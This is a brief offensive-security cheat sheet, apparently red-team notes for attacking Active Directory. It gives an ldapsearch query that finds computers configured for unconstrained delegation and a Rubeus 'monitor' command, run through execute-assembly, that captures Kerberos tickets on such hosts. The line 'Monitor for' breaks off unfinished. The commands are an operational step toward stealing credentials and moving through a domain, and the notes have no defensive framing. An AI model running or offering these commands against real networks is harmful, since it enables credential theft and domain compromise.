
Search for computers configured for Unconstrained Delegation
```powershell
ldapsearch (&(samAccountType=805306369 (userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

Monitor for 
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
```